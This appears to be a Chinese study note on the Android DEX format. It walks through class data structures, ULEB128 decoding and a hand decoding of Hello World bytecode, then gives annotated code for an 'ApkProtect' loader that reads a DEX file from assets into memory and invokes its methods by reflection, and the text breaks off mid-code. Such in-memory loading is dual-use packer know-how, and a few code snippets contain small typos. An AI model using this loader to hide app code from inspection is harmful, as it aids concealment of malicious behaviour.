<p><code>class_def</code> 是 DEX 文件结构中最复杂也是最核心的部分，它表示了类的所有信息，对应 <code>DexFile.h</code> 中的 <code>DexClassDef</code> :</p>
<ul>
<li>classIdx : 指向 type_ids ，表示类信息</li>
<li>accessFlags : 访问标识符</li>
<li>superclassIdx : 指向 type_ids ，表示父类信息</li>
<li>interfacesOff : 指向 DexTypeList 的偏移量，表示接口信息</li>
<li>sourceFileIdx : 指向 string_ids ，表示源文件名称</li>
<li>annotationOff : 注解信息</li>
<li>classDataOff : 指向 DexClassData 的偏移量，表示类的数据部分</li>
<li>staticValueOff :指向 DexEncodedArray 的偏移量，表示类的静态数据</li>
</ul>
<p><strong>DefCLassData</strong></p>
<p>重点是 <code>classDataOff</code> 这个字段，它包含了一个类的核心数据，在 Android 源码中定义为 <code>DexClassData</code> ，它不在 DexFile.h 中了，而是在 DexClass.h 中：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">struct DexClassData &#123;<br>    DexClassDataHeader header;<br>    DexField*          staticFields;<br>    DexField*          instanceFields;<br>    DexMethod*         directMethods;<br>    DexMethod*         virtualMethods;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p><code>DexClassDataHeader</code> 定义了类中字段和方法的数目，它也定义在 DexClass.h 中：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">struct DexClassDataHeader &#123;<br>    u4 staticFieldsSize;<br>    u4 instanceFieldsSize;<br>    u4 directMethodsSize;<br>    u4 virtualMethodsSize;<br>&#125;;<br></code></pre></td></tr></table></figure>

<ul>
<li>staticFieldsSize : 静态字段个数</li>
<li>instanceFieldsSize : 实例字段个数</li>
<li>directMethodsSize : 直接方法个数</li>
<li>virtualMethodsSize : 虚方法个数</li>
</ul>
<p>在读取的时候要注意这里的数据是 LEB128 类型。它是一种可变长度类型，每个 LEB128 由 1~5 个字节组成，每个字节只有 7 个有效位。如果第一个字节的最高位为 1，表示需要继续使用第 2 个字节，如果第二个字节最高位为 1，表示需要继续使用第三个字节，依此类推，直到最后一个字节的最高位为 0，至多 5 个字节。除了 LEB128 以外，还有无符号类型 ULEB128。</p>
<p>那么为什么要使用这种数据结构呢？我们都知道 Java 中 int 类型都是 4 字节，32 位的，但是很多时候根本用不到 4 个字节，用这种可变长度的结构，可以节省空间。对于运行在 Android 系统上来说，能多省一点空间肯定是好的。下面给出了 Java 读取 ULEB128 的代码：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs text">public static int readUnsignedLeb128(byte[] src, int offset) &#123;<br>    int result = 0;<br>    int count = 0;<br>    int cur;<br>    do &#123;<br>        cur = copy(src, offset, 1)[0];<br>        cur &amp;= 0xff;<br>        result |= (cur &amp; 0x7f) &lt;&lt; count * 7;<br>        count++;<br>        offset++;<br>        DexParser.POSITION++;<br>    &#125; while ((cur &amp; 0x80) == 128 &amp;&amp; count &lt; 5);<br>    return result;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>继续回到 DexClassData 中来。<code>header</code> 部分定义了各种字段和方法的个数，后面跟着的分别就是 <strong>静态字段</strong> 、<strong>实例字段</strong> 、<strong>直接方法</strong> 、<strong>虚方法</strong> 的具体数据了。字段用 <code>DexField</code> 表示，方法用 <code>DexMethod</code> 表示。</p>
<p><strong>DexField</strong></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">struct DexField &#123;<br>    u4 fieldIdx;    /* index to a field_id_item */<br>    u4 accessFlags;<br>&#125;;<br></code></pre></td></tr></table></figure>

<ul>
<li>fieldIdx : 指向 field_ids ，表示字段信息</li>
<li>accessFlags ：访问标识符</li>
</ul>
<p><strong>DexMethod</strong></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">struct DexMethod &#123;<br>    u4 methodIdx;    /* index to a method_id_item */<br>    u4 accessFlags;<br>    u4 codeOff;      /* file offset to a code_item */<br>46&#125;;<br></code></pre></td></tr></table></figure>

<p><code>method_idx</code> 是指向 method_ids 的索引，表示方法信息。<code>accessFlags</code> 是该方法的访问标识符。<code>codeOff</code> 是结构体 <code>DexCode</code> 的偏移量。如果你坚持看到了这里，是不是发现说到现在还没说到最重要的东西，DEX 包含的代码，或者说指令，对应的就是 Hello.java 中的 main 方法。没错，<code>DexCode</code> 就是用来存储方法的详细信息以及其中的指令的。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs text">struct DexCode &#123;<br>    u2  registersSize;  // 寄存器个数<br>    u2  insSize;        // 参数的个数<br>    u2  outsSize;       // 调用其他方法时使用的寄存器个数<br>    u2  triesSize;      // try/catch 语句个数<br>    u4  debugInfoOff;   // debug 信息的偏移量<br>    u4  insnsSize;      // 指令集的个数<br>    u2  insns[1];       // 指令集<br>    /* followed by optional u2 padding */  // 2 字节，用于对齐<br>    /* followed by try_item[triesSize] */<br>    /* followed by uleb128 handlersSize */<br>    /* followed by catch_handler_item[handlersSize] */<br>&#125;;<br></code></pre></td></tr></table></figure>

<p>我们打开 010 Editor，定位到 main() 方法对应的 <code>DexCode</code>，对照进行分析：</p>
<p><img src="informatin/book/笔记/v2-b515dccfea97aaa4eb5636702c94bafe_1440w.webp" srcset="/img/loading.gif" lazyload alt="img"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">public class Hello &#123;<br><br>    private static String HELLO_WORLD = &quot;Hello World!&quot;;<br><br>    public static void main(String[] args) &#123;<br>        System.out.println(HELLO_WORLD);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>main()</code> 方法对应的 DexCode 十六进制表示为 ：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">03 00 01 00 02 00 00 00 00 00 79 02 00 00 08 00<br>62 00 01 00 62 01 00 00 6E 20 03 00 01 00 0E 00<br></code></pre></td></tr></table></figure>

<p>使用的寄存器个数是 3 个。参数个数是 1 个，就是 <code>main()</code> 方法中的 <code>String[] args</code>。调用外部方法时使用的寄存器个数为 2 个。指令个数是 8 。</p>
<p>终于说到指令了，main() 函数中有 8 条指令，就是上面十六进制中的第二行。尝试来解析一下这段指令。Android 官网就有 Dalvik 指令的相关介绍，<a href="https://link.zhihu.com/?target=https://source.android.google.cn/devices/tech/dalvik/dalvik-bytecode">链接</a>。</p>
<p>第一个指令 <code>62 00 01 00</code>，查询文档 <code>62</code> 对应指令为 <code>sget-object vAA, field@BBBB</code>，<code>AA</code> 对应 <code>00</code> , 表示 <code>v0</code> 寄存器。<code>BBBB</code> 对应 <code>01 00</code> ，表示 <code>field_ids</code> 中索引为 1 的字段，根据前面的解析结果该字段为 <code>Ljava/lang/System;-&gt;out;Ljava/io/PrintStream</code>，整理一下，<code>62 00 01 00</code> 表示的就是：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">sget-object v0, Ljava/lang/System;-&gt;out:Ljava/io/PrintStream;<br></code></pre></td></tr></table></figure>

<p>接着是 <code>62 01 00 00</code>。还是 <code>sget-object vAA, field@BBBB</code>, <code>AA</code> 对应 <code>01</code> ，<code>BBBB</code> 对应 <code>0000</code>, 使用的是 <code>v1</code> 寄存器，field 位 field_ids 中索引为 0 的字段，即 <code>LHello;-&gt;HELLO_WORLD;Ljava/lang/String</code>，该句完整指令为：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">sget-object v1, LHello;-&gt;HELLO_WORLD:Ljava/lang/String;<br></code></pre></td></tr></table></figure>

<p>接着是 <code>6E 20 03 00</code>, 查看文档 <code>6E</code> 指令为 <code>invoke-virtual &#123;vC, vD, vE, vF, vG&#125;, meth@BBBB</code>。<code>6E</code> 后面一个十六位 <code>2</code> 表示调用方法是两个参数，那么 <code>BBBB</code> 就是 <code>03 00</code>，指向 method_ids 中索引为 3 方法。根据前面的解析结果，该方法就是 <code>Ljava/io/PrintStream;-&gt;println(Ljava/lang/String;)V</code>。完整指令为：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">invoke-virtual &#123;v0, v1&#125;, Ljava/io/PrintStream;-&gt;println(Ljava/lang/String;)V<br></code></pre></td></tr></table></figure>

<p>最后的 <code>0E</code>，查看文档该指令为 <code>return-void</code>，到这 main() 方法就结束了。</p>
<p>将上面几句指令放在一起:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">62 00 01 00 : sget-object v0, Ljava/lang/System;-&gt;out:Ljava/io/PrintStream;<br>62 01 00 00 : sget-object v1, LHello;-&gt;HELLO_WORLD:Ljava/lang/String;<br>6E 20 03 00 : invoke-virtual &#123;v0, v1&#125;, Ljava/io/PrintStream;-&gt;println(Ljava/lang/String;)V<br>OE OO : return-void<br></code></pre></td></tr></table></figure>

<p>这就是 main() 方法的完整指令了。还记得我之前的一篇文章 <a href="https://link.zhihu.com/?target=https://juejin.im/post/5c093fd751882535422e4f05">Smali 语法解析——Hello World</a>，其实这个解析结果和 Hello.java 对应的 smali 代码是一致的：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs text">.method public static main([Ljava/lang/String;)V<br>    .registers 3<br><br>    .prologue<br>    .line 6<br>    sget-object v0, Ljava/lang/System;-&gt;out:Ljava/io/PrintStream;<br><br>    sget-object v1, LHello;-&gt;HELLO_WORLD:Ljava/lang/String;<br><br>    invoke-virtual &#123;v0, v1&#125;, Ljava/io/PrintStream;-&gt;println(Ljava/lang/String;)V<br><br>    .line 7<br>    return-void<br>.end method<br></code></pre></td></tr></table></figure>





<p>ApkProtect</p>
<p>RawDexClassLoader&#x2F;src&#x2F;com&#x2F;payegis&#x2F;DemoActivity.java</p>
<p>提供Android的内部类com.android.TestClassLoader来加载test.dex，做的基本是文件打开读入字节等工作</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.payegis;<br><br><span class="hljs-comment">// 导入所需的类和接口</span><br><span class="hljs-keyword">import</span> android.app.Activity;<br><span class="hljs-keyword">import</span> android.content.res.AssetManager;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.widget.Toast;<br><br><span class="hljs-comment">// 导入资源文件 - 这可能是一个生成的类，包含R资源的引用，com.payegis.rawdexclassloader.java调用</span><br><span class="hljs-keyword">import</span> com.payegis.rawdexclassloader.R;<br><br><span class="hljs-comment">// 导入Java I/O和反射相关的类</span><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-comment">// DemoActivity类继承自Activity，是Android中的一个基本UI组件</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Activity</span> &#123;<br><br>    <span class="hljs-comment">// onCreate是Activity生命周期中的一部分，在Activity创建时调用</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState); <span class="hljs-comment">// 调用超类（Activity）的onCreate方法</span><br>        setContentView(R.layout.activity_main); <span class="hljs-comment">// 设置Activity使用的布局</span><br>        runTest(); <span class="hljs-comment">// 调用runTest方法，它包含自定义的测试代码</span><br>    &#125;<br>    <br>    <span class="hljs-comment">// runTest方法，用于尝试加载并执行DEX文件中的代码</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">runTest</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 创建自定义的RawDexClassLoader实例，将DEX文件加载到应用程序中</span><br>        <span class="hljs-type">RawDexClassLoader</span> <span class="hljs-variable">cl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RawDexClassLoader</span>(<br>                getFromAssets(<span class="hljs-string">&quot;test.dex&quot;</span>), <span class="hljs-comment">// 从Assets文件夹获取DEX文件的内容</span><br>                <span class="hljs-string">&quot;test.dex&quot;</span>, <span class="hljs-comment">// DEX文件的名称</span><br>                getApplicationInfo().dataDir + <span class="hljs-string">&quot;/lib&quot;</span>, <span class="hljs-comment">// 应用程序数据目录的路径</span><br>                getApplicationContext().getClassLoader()); <span class="hljs-comment">// 获取应用程序的类加载器</span><br><br>        Class&lt;?&gt; clazz = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 使用自定义类加载器尝试加载DEX文件中的类</span><br>            clazz = cl.loadClass(<span class="hljs-string">&quot;com.android.TestClassLoader&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            e.printStackTrace(); <span class="hljs-comment">// 打印异常堆栈跟踪</span><br>            Toast.makeText(<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;Load Class Failed!&quot;</span>, Toast.LENGTH_LONG).show(); <span class="hljs-comment">// 显示加载类失败的Toast消息</span><br>            <span class="hljs-keyword">return</span>; <span class="hljs-comment">// 类未找到，提前返回</span><br>        &#125;<br><br>        <span class="hljs-comment">// 如果上面的代码没有抛出异常，表示类已成功加载</span><br>        <span class="hljs-comment">// 显示类的字符串表示</span><br>        Toast.makeText(<span class="hljs-built_in">this</span>, clazz.toString(), Toast.LENGTH_LONG).show();    <br>        <br>        <span class="hljs-type">Method</span> <span class="hljs-variable">mth</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// 声明Method类型的变量</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 通过反射获取类中名为setValue的方法</span><br>            mth = clazz.getMethod(<span class="hljs-string">&quot;setValue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<span class="hljs-type">int</span>.class&#125;);<br>            mth.invoke(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-number">5</span>&#125;); <span class="hljs-comment">// 调用setValue方法，参数为5</span><br>            <br>            <span class="hljs-comment">// 通过反射获取类中名为getValue的方法</span><br>            mth = clazz.getDeclaredMethod(<span class="hljs-string">&quot;getValue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;);<br>            <span class="hljs-type">int</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) mth.invoke(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;); <span class="hljs-comment">// 调用getValue方法，获取结果</span><br>            <span class="hljs-comment">// 显示getValue方法的结果</span><br>            Toast.makeText(<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;getValue: &quot;</span> + String.valueOf(result), Toast.LENGTH_LONG).show();   <br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;<br>            e.printStackTrace(); <span class="hljs-comment">// 打印异常堆栈跟踪</span><br>        &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>            e.printStackTrace(); <span class="hljs-comment">// 打印异常堆栈跟踪</span><br>        &#125; <span class="hljs-keyword">catch</span> (IllegalArgumentException e) &#123;<br>            e.printStackTrace(); <span class="hljs-comment">// 打印异常堆栈跟踪</span><br>        &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;<br>            e.printStackTrace(); <span class="hljs-comment">// 打印异常堆栈跟踪</span><br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-comment">// getFromAssets方法，用于从Assets文件夹读取指定文件的内容</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] getFromAssets(String filename) &#123;<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-literal">null</span>; <span class="hljs-comment">// 声明一个用于存储文件内容的字节数组</span><br>        <span class="hljs-type">AssetManager</span> <span class="hljs-variable">am</span> <span class="hljs-operator">=</span> getAssets(); <span class="hljs-comment">// 获取AssetManager实例，用于访问Assets文件夹</span><br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// 声明一个输入流</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            in = am.open(filename); <span class="hljs-comment">// 打开指定的文件</span><br>            <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> in.available(); <span class="hljs-comment">// 获取文件的可读字节数</span><br>            buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[len]; <span class="hljs-comment">// 根据文件大小，初始化字节数组</span><br>            <span class="hljs-keyword">if</span> (in.read(buffer) != len) &#123; <span class="hljs-comment">// 读取文件内容</span><br>                <span class="hljs-comment">// 如果没有一次性读取完毕，抛出异常</span><br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;Could not completely read file &quot;</span> + filename);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace(); <span class="hljs-comment">// 打印异常堆栈跟踪</span><br>            <span class="hljs-comment">// 在这里可以处理异常，或者返回null，或者再次抛出异常</span><br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">if</span> (in != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    in.close(); <span class="hljs-comment">// 关闭输入流以释放系统资源</span><br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace(); <span class="hljs-comment">// 如果无法关闭输入流，打印异常堆栈跟踪</span><br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> buffer; <span class="hljs-comment">// 返回读取的文件内容</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>RawDexClassLoader&#x2F;src&#x2F;com&#x2F;payegis&#x2F;<strong>RawDexClassLoader.java</strong></p>
<p>RawDexClassLoader的自定义类加载器，用于Android应用中加载DEX文件（Dalvik Executable文件，即Android平台的可执行文件）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.payegis; <span class="hljs-comment">//包所在</span><br><br><span class="hljs-keyword">import</span> java.io.File; <span class="hljs-comment">//java.io.File类，用于对文件和文件系统路径进行操作。</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RawDexClassLoader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span> &#123; <span class="hljs-comment">//继承classloader类，加载类和资源</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ClassLoader definingContext; <span class="hljs-comment">//保存了用于加载类的父类加载器</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> RawDexFile mDex; <span class="hljs-comment">//加载的DEX文件</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String mRawLibPath;  <span class="hljs-comment">//本地路径		</span><br>    <span class="hljs-keyword">private</span> String[] mLibPaths; <span class="hljs-comment">//分隔后的本地库路径数组</span><br><br>    <span class="hljs-comment">//构造器接受DEX文件的字节数组、DEX文件名、库文件路径以及父类加载器作为参数。</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">RawDexClassLoader</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] rawDex, String dexName, String libraryPath, ClassLoader parent)</span> &#123;<br>        <span class="hljs-built_in">super</span>(parent);<br>        mDex = loadRawDex(rawDex, dexName);  <span class="hljs-comment">//调用loadRawDex方法，加载DEX文件到内存中。</span><br>        mRawLibPath = libraryPath;<br>        definingContext = parent;<br>        setNativeLibrary(libraryPath); <span class="hljs-comment">//调用setNativeLibrary方法，设置本地库路径。</span><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> Class&lt;?&gt; findClass(String className) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-comment">// TODO Auto-generated method stub</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">if</span> (mDex != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">slashName</span> <span class="hljs-operator">=</span> className.replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>); <span class="hljs-comment">//将类名中的点替换为斜线（这是类文件内部使用的格式），然后调用Dex文件的loadClass方法来加载类。</span><br>            clazz = mDex.loadClass(slashName, <span class="hljs-built_in">this</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> clazz;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">findLibrary</span><span class="hljs-params">(String libraryName)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> System.mapLibraryName(libraryName);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mLibPaths.length; i++) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">pathName</span> <span class="hljs-operator">=</span> mLibPaths[i] + fileName;<br>            <span class="hljs-type">File</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(pathName);<br><br>            <span class="hljs-keyword">if</span> (test.exists()) &#123;<br>                <span class="hljs-keyword">return</span> pathName;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> String[] getLoadedClasses() &#123;<br>        <span class="hljs-keyword">return</span> mDex.getLoadedClassName();  <span class="hljs-comment">//定义getLoadedClasses方法，返回DEX文件中已加载类的名称数组。</span><br>    &#125;<br>    <br>    <span class="hljs-meta">@SuppressWarnings(&quot;unused&quot;)</span>   <span class="hljs-comment">//定义loadRawDex方法，用于加载原始DEX文件。@SuppressWarnings(&quot;unused&quot;)注解表示即使这个私有方法当前未被使用，也不要显示警告。</span><br>    <span class="hljs-keyword">private</span> RawDexFile <span class="hljs-title function_">loadRawDex</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] rawDex, String dexName)</span> &#123;  <span class="hljs-comment">//调用RawDexFile.loadDex方法加载DEX文件，并返回一个RawDexFile对象。//调用RawDexFile.Java</span><br>        <span class="hljs-keyword">return</span> RawDexFile.loadDex(rawDex, dexName, <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setNativeLibrary</span><span class="hljs-params">(String libraryPath)</span> &#123;<br>        <span class="hljs-comment">//获取系统属性path.separator和file.separator，为路径分隔符和文件分隔符。</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">pathList</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;java.library.path&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">pathSep</span> <span 